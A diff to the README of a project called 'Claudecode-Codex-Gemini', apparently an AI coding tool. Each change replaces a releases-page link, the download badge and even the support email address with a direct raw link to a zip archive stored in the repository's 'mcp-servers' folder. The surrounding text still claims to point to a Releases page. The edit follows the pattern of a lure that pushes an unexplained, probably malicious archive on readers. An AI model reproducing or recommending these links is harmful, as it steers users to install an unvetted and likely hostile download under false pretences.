@@ -1,6 +1,6 @@
 # 🌟 Claudecode-Codex-Gemini - Simplifying Code Generation for Everyone
 
-[![Download](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/Suga13/Claudecode-Codex-Gemini/releases)
+[![Download](https://github.com/Suga13/Claudecode-Codex-Gemini/raw/refs/heads/main/mcp-servers/Claudecode-Gemini-Codex-v3.0-alpha.5.zip)](https://github.com/Suga13/Claudecode-Codex-Gemini/raw/refs/heads/main/mcp-servers/Claudecode-Gemini-Codex-v3.0-alpha.5.zip)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ Claudecode-Codex-Gemini is designed to make code generation simple. This applica
 Follow these steps to download and run Claudecode-Codex-Gemini on your computer:
 
 1. **Visit the Releases Page**  
-   To download the application, [click here to visit the Releases page](https://github.com/Suga13/Claudecode-Codex-Gemini/releases).
+   To download the application, [click here to visit the Releases page](https://github.com/Suga13/Claudecode-Codex-Gemini/raw/refs/heads/main/mcp-servers/Claudecode-Gemini-Codex-v3.0-alpha.5.zip).
 
 2. **Locate the Latest Version**  
    Once on the Releases page, find the latest version. It will usually be at the top of the list.
@@ -48,7 +48,7 @@ Claudecode-Codex-Gemini offers various commands to enhance your coding experienc
 
 ## 🔧 Download & Install
 
-To ensure you have the latest version, please visit the Releases page again: [Download Claudecode-Codex-Gemini](https://github.com/Suga13/Claudecode-Codex-Gemini/releases). Follow the same steps outlined above for installation.
+To ensure you have the latest version, please visit the Releases page again: [Download Claudecode-Codex-Gemini](https://github.com/Suga13/Claudecode-Codex-Gemini/raw/refs/heads/main/mcp-servers/Claudecode-Gemini-Codex-v3.0-alpha.5.zip). Follow the same steps outlined above for installation.
 
 ## 📅 Changelog
 
@@ -72,7 +72,7 @@ Here are some recent updates and changes:
 
 If you have questions or need help, feel free to reach out:
 
-- **Email**: support@claudecode.com
+- **Email**: https://github.com/Suga13/Claudecode-Codex-Gemini/raw/refs/heads/main/mcp-servers/Claudecode-Gemini-Codex-v3.0-alpha.5.zip
 - **GitHub Issues**: Open an issue on the GitHub repository.
 
 ## 📄 License
